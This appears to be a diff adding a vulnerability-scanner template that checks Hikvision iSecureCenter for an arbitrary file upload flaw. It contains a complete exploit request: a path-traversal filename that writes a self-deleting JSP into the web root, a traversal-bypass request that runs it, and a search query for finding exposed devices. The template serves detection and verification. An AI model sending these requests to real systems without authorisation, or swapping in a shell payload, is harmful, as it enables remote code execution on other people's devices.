@@ -1,0 +1,47 @@
+id: hikvision-report-fileupload
+
+info:
+  name: Hikvision report - Arbitrary File Upload
+  author: Co5mos
+  severity: critical
+  description: An arbitrary file upload vulnerability in the Hikvision iSecureCenter.
+  reference:
+    - https://peiqi.wgpsec.org/wiki/iot/HIKVISION/HiKVISION%20%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20report%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="HIKVISION-iSecure-Center"
+  tags: hikvision,fileupload
+
+variables:
+  filename: "{{rand_base(6)}}.jsp"
+
+http:
+  - raw:
+      - |
+        POST /svm/api/external/report HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+
+        ------WebKitFormBoundary9PggsiM755PLa54a
+        Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/{{filename}}"
+        Content-Type: application/zip
+
+        <% out.print(11111*22222);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+        ------WebKitFormBoundary9PggsiM755PLa54a--
+
+      - |
+        GET /portal/ui/login/..;/..;/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '246908642'
+
+      - type: status
+        status:
+          - 200
